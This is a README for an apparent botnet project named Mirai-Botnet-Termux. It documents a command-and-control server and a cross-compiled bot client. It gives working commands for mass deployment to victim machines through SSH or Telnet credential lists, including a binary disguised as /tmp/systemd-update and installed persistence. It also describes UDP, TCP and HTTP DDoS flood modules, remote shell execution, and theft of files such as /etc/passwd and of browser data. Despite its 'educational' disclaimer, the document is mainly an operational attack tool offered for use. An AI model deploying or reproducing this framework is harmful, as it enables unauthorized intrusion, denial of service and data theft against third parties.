# Mirai-Botnet-Termux

A modular C2 (Command & Control) botnet framework written in **Python** (CNC server) + **C++** (bot client). Designed for educational security research on Termux/Android and Linux VPS.

## Architecture

```
[ATTACKER - Termux/VPS]                         [VICTIM MACHINES]
─────────────────────────                        ─────────────────
CNC Server (Python asyncio)                     Bot (C++ static binary)
├── server.py    ← TCP listener (AES-GCM)      ├── client       ← CNC connection
├── cli.py       ← Rich UI (TCP/SSH)            ├── modules/     ← payload binaries
├── ssh_cli.py   ← SSH remote control           └── persistence  ← auto-start
├── cli_handler.py ← shared command dispatch
├── loader.py    ← SSH/Telnet deployer
├── handler.py   ← per-bot protocol
├── db.py        ← SQLite storage
└── commands.py  ← dispatch queue
```

### Deploy Flow

```
loader.py reads ip:port:user:pass from targets.txt
    │
    ├── SSH (port 22) or Telnet (port 23) into each machine
    ├── Detect arch (uname -m) → select matching binary
    ├── Upload binary via SCP (SSH) or base64 echo (Telnet)
    ├── chmod +x && execute in background
    └── Bot connects back to CNC server via TCP (AES-256-GCM encrypted)
```

### Operation Flow

```
cli.py ──(TCP)──→ server.py ──(TCP, AES-GCM)──→ Bot on victim
  │                    │
ssh ──(SSH)──→          │
  │                    │
  │  bots list         ├── manage bot pool
  │  bots count        ├── dispatch commands
  │  bot info <id>     ├── collect results
  │  cmd <id> <mod>... └── track OS/arch/hostname per bot
```

### Bot Tracking

When a bot first connects, it sends system info to the CNC server:

```
Bot sends:  { "os": "Linux", "os_version": "Ubuntu 22.04",
              "arch": "x86_64", "kernel": "5.15.0-91",
              "hostname": "victim-pc" }
Server:    Stores in SQLite, displays via CLI
```

CLI output (Rich-formatted):
```
[CNC]> bots list
┌────┬──────────────────┬────────┬──────────┬──────────────┬──────────┐
│ ID │ OS               │ Arch   │ Hostname │ IP           │ Status   │
├────┼──────────────────┼────────┼──────────┼──────────────┼──────────┤
│ 1  │ Ubuntu 22.04     │ x86_64 │victim-pc │ 10.0.0.5     │ online   │
│ 2  │ Debian 11        │aarch64 │raspberry │ 192.168.1.99 │ online   │
│ 3  │ CentOS 7         │ x86_64 │web-server│ 10.0.1.20    │ offline  │
└────┴──────────────────┴────────┴──────────┴──────────────┴──────────┘

[CNC]> bots count
┌────────────────────────────┐
│ Total: 3  Online: 2  Offline: 1 │
└────────────────────────────┘
  Ubuntu 22.04: 1  Debian 11: 1  CentOS 7: 1

[CNC]> bot info 1
┌──────────────────────────────────────┐
│ Bot #1                               │
│   Bot ID:      victim-pc_a1b2c3d4    │
│   OS:          Ubuntu 22.04          │
│   Arch:        x86_64                │
│   Kernel:      5.15.0-91-generic     │
│   Hostname:    victim-pc             │
│   IP:          10.0.0.5              │
│   Status:      online                │
│   First seen:  2026-05-25 12:30:00   │
│   Last seen:   2026-05-25 14:22:00   │
└──────────────────────────────────────┘
```

## Project Structure

```
Mirai-Botnet-Termux/
├── server/                    # CNC - Python (attacker machine)
│   ├── server.py              # Main asyncio server (TCP + AES-GCM)
│   ├── cli.py                 # Rich-formatted interactive CLI
│   ├── cli_handler.py         # Shared command dispatch (TCP + SSH)
│   ├── ssh_cli.py             # SSH server for remote CNC control
│   ├── loader.py              # SSH/Telnet bulk deployer
│   ├── handler.py             # Per-bot protocol handler
│   ├── db.py                  # SQLite (aiosqlite)
│   └── commands.py            # Command dispatch queue
├── shared/                    # Shared protocol (Python)
│   ├── crypto.py              # AES-256-GCM encrypt/decrypt
│   └── protocol.py            # Message types, framing, factories
├── bot/                       # Bot - C++ (victim machine)
│   ├── Makefile               # Build + cross-compile
│   ├── client.cpp             # Main bot: connect, auth, cmd loop
│   ├── common.h               # Crypto, JSON, system info, framing
│   ├── persistence.cpp        # Auto-start (cron, rc.local, systemd)
│   └── modules/
│       ├── shell.cpp          # Shell command execution
│       ├── flood.cpp          # UDP/TCP/HTTP DDoS
│       ├── steal.cpp          # File/directory/browser data theft
│       └── recon.cpp          # System/network reconnaissance
├── scripts/
│   ├── setup.sh               # Install dependencies
│   └── build_bot.sh           # Cross-compile all architectures
├── tests/
│   ├── test_shared/           # Crypto + protocol tests
│   └── test_server/           # Database + command queue tests
├── config.example.yaml        # Configuration template
├── targets.example.txt        # Deploy target list template
├── requirements.txt           # Python dependencies
└── pytest.ini                 # Test configuration
```

## Technology Stack

| Component | Language | Details |
|-----------|----------|---------|
| CNC Server | Python 3.11+ | asyncio, AES-GCM, SQLite, asyncssh |
| CNC CLI | Python 3.11+ | Rich UI, TCP or SSH remote control |
| Loader | Python 3.11+ | SSH (paramiko), Telnet (telnetlib), SCP |
| Bot Client | C++17 (static) | OpenSSL (AES-GCM + SHA-256), no dependencies |
| Bot Modules | C++17 (static) | Independent binaries via popen() |

**Why C++ static binaries for the bot?**
- Victim machines often lack Python or libraries
- Static binaries run on any Linux without dependencies
- Cross-compiled for: arm, aarch64, x86, x86_64, mips, mipsel

## Quick Start

### Prerequisites

```bash
# Termux
pkg install python rust binutils clang make

# Linux VPS
apt install python3 python3-pip clang make libssl-dev
```

### Setup

```bash
# Clone and setup
git clone <repo-url>
cd Mirai-Botnet-Termux
bash scripts/setup.sh

# This installs Python deps, creates config.yaml with random encryption key
```

### Start CNC Server

```bash
# Terminal 1: Start the CNC server
python -m server.server --config config.yaml
# Output:
# [2026-05-25 12:00:00] INFO: CNC Server listening on 0.0.0.0:8443 (plain TCP, AES-GCM)
# [2026-05-25 12:00:00] INFO: SSH CLI server listening on 0.0.0.0:2222

# Terminal 2: Open attacker CLI (local TCP)
python -m server.cli
# Or connect remotely via SSH:
ssh -o StrictHostKeyChecking=no -p 2222 admin@<cnc-server-ip>
```

### Build Bot Binaries

```bash
# Native build (current architecture only)
cd bot && make

# Cross-compile for all architectures
bash scripts/build_bot.sh
```

### Deploy Bots

```bash
# Create targets file (ip:port:user:pass)
cat > targets.txt << 'EOF'
192.168.1.10:22:root:admin123
192.168.1.11:23:admin:password
10.0.0.5:2222:ubuntu:ubuntu
EOF

# Deploy with auto arch detection
python -m server.loader --targets targets.txt --binary-dir dist/ --threads 20
```

## Bot Configuration Guide

### How to Set CNC Server IP and Port for Bot

The bot needs to know where to connect. There are two ways to configure this:

#### Method 1: Command-line arguments (recommended)

```bash
# On the victim machine, run the bot with:
./client <cnc_host> <cnc_port> <encryption_key_hex>

# Example:
./client 192.168.1.100 8443 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
```

The bot uses these positional arguments:
- `<cnc_host>` — IP or hostname of your CNC server (e.g., your VPS IP or Termux IP)
- `<cnc_port>` — Port the CNC server listens on (default: 8443)
- `<key_hex>` — 64-character hex string = 32 bytes AES-256 key (same as in config.yaml)

#### Method 2: Compile-time defaults

If no arguments are given, the bot uses compile-time defaults defined in `bot/common.h`:

```cpp
#ifndef CNC_HOST
#define CNC_HOST "127.0.0.1"  // Change this to your CNC server IP
#endif
#ifndef CNC_PORT
#define CNC_PORT 8443
#endif
#ifndef CNC_KEY
#define CNC_KEY "0123456789abcdef..."  // 64-char hex key
#endif
```

To build with custom defaults:

```bash
# Using make with compile flags:
make CXXFLAGS="-DCNC_HOST='\"your-server-ip\"' -DCNC_PORT=8443 -DCNC_KEY='\"your-64-char-hex-key\"'"

# Or edit bot/common.h directly before building
```

#### How to Find Your CNC Server IP

```bash
# On Termux:
ifconfig wlan0 | grep "inet " | awk '{print $2}'

# On VPS:
curl -s ifconfig.me
# or
hostname -I
```

#### Encryption Key

The encryption key must match between CNC server and bot. Find it in `config.yaml`:

```yaml
crypto:
  key: "a1b2c3d4e5f6..."  # This is your 64-char hex key
```

Generate a new random key:
```bash
python3 -c "import os; print(os.urandom(32).hex())"
```

### Manual Bot Deployment (without loader)

If you can't use the loader, manually deploy the bot:

```bash
# 1. Build the bot for the target architecture
cd bot && make TARGET=x86_64

# 2. Copy the binary to the victim machine
scp ../dist/client.x86_64 user@victim:/tmp/systemd-update

# 3. SSH into the victim and run
ssh user@victim
chmod +x /tmp/systemd-update
/tmp/systemd-update <cnc_ip> 8443 <key_hex> &

# 4. (Optional) Install persistence
scp ../dist/persistence.x86_64 user@victim:/tmp/
ssh user@victim "/tmp/persistence.x86_64 <cnc_ip> 8443 <key_hex> /tmp/systemd-update"
```

## CLI Commands

### Local CLI (python -m server.cli)

```
[CNC]> help

CNC Commands
═════════════
Monitoring
  bots list              List all connected bots
  bots count             Show bot statistics (total/online/offline)
  bot info <id>          Show detailed info for one bot
  ping                   Check if CNC server is online

Command Dispatch
  cmd <bot_id> <module> [key=val ...]  Send command to one bot
  cmd status <cmd_id>                  Check command result

Broadcast Attacks (all online bots)
  udp-attack <target> <port> [threads=N] [duration=S] [size=B]
  tcp-attack <target> <port> [threads=N] [duration=S] [size=B]
  http-attack <target> <port> [threads=N] [duration=S]

Single Bot
  shell <bot_id> <command>  Execute shell on one bot

Utility
  help              This help
  exit              Quit
```

### SSH Remote Control

```bash
# Connect via SSH
ssh -o StrictHostKeyChecking=no -p 2222 admin@<cnc-server-ip>
# Enter password (configured in config.yaml > ssh.password)

# Same commands as local CLI, plain-text output:
CNC> bots list
CNC> cmd 1 shell whoami
CNC> ping
CNC> exit
```

### Module Reference

**shell** — Execute shell commands
```
cmd <bot_id> shell cmd=whoami
cmd <bot_id> shell cmd="ls -la /tmp"
```

**flood** — DDoS attacks (UDP/TCP SYN/HTTP)
```
cmd <bot_id> flood type=udp target=10.0.0.5 port=80 duration=60
cmd <bot_id> flood type=tcp target=10.0.0.5 port=443 threads=100
cmd <bot_id> flood type=http target=10.0.0.5 port=80 threads=50 duration=30
```

**recon** — System reconnaissance
```
cmd <bot_id> recon type=system     # OS, CPU, memory, user info
cmd <bot_id> recon type=network    # IP, routes, DNS, ARP
cmd <bot_id> recon type=process    # Running processes
cmd <bot_id> recon type=all        # Everything
```

**steal** — Data exfiltration
```
cmd <bot_id> steal type=file path=/etc/passwd
cmd <bot_id> steal type=dir path=/var/www
cmd <bot_id> steal type=browser    # Find browser cookie/profile paths
```

## Protocol

### Wire Format

```
[4 bytes: payload length (network byte order, big-endian)]
[payload: AES-256-GCM encrypted JSON]
```

Encryption is at the payload level. There is no TLS wrapping — the TCP connection is plain but every message is individually AES-256-GCM encrypted.

### Message Types

| Type | Direction | Data |
|------|-----------|------|
| `auth` | Bot → CNC | `bot_id`, `key_hash` |
| `auth_ack` | CNC → Bot | `status`, `session_id` |
| `info` | Bot → CNC | `os`, `os_version`, `arch`, `kernel`, `hostname` |
| `cmd` | CNC → Bot | `cmd_id`, `module`, `params` |
| `result` | Bot → CNC | `cmd_id`, `output`, `exit_code` |
| `heartbeat` | Bot → CNC | `{}` |
| `error` | Both | `code`, `message` |

### Security

- AES-256-GCM authenticated encryption for all traffic
- Per-message random IV (12 bytes)
- Nonce-based replay protection (300s TTL)
- Timestamp drift detection (±60s window)
- Constant-time key hash comparison (timing attack resistant)
- No hardcoded secrets (config file + CLI args only)

## Configuration

Copy `config.example.yaml` to `config.yaml` and customize:

```yaml
server:
  host: "0.0.0.0"       # Bot listener bind address
  port: 8443             # Bot listener port
  cli_host: "127.0.0.1" # CLI TCP bind (localhost only for security)
  cli_port: 8444         # CLI TCP port

ssh:
  enabled: true          # Enable SSH remote control
  host: "0.0.0.0"        # SSH bind address
  port: 2222             # SSH port
  password: "change-me"  # SSH password (CHANGE THIS!)

crypto:
  # AES-256 key: 64 hex chars = 32 bytes
  # Generate: python3 -c "import os; print(os.urandom(32).hex())"
  key: "<64-char-hex-key>"

database:
  path: "cnc.db"

heartbeat:
  interval: 30           # seconds between heartbeats
  timeout: 90            # seconds until bot marked offline

loader:
  timeout: 30            # SSH/Telnet connection timeout
  binary_dir: "dist/"    # Directory for bot binaries
```

### Security Notes

- **Change the SSH password** immediately in `config.yaml`
- **Change the crypto key** immediately — the example key is public
- `cli_host` should remain `127.0.0.1` unless you need remote TCP CLI access
- `config.yaml` and `targets.txt` are in `.gitignore` — never commit them

## Testing

```bash
# Install test dependencies
pip install -r requirements.txt

# Run all tests
pytest tests/ -v

# Run specific test suites
pytest tests/test_shared/ -v    # Crypto + protocol tests
pytest tests/test_server/ -v    # Database + command queue tests
```

## Disclaimer

This project is for **educational and authorized security research purposes only**. Unauthorized access to computer systems is illegal. The authors assume no liability for misuse.

## License

MIT
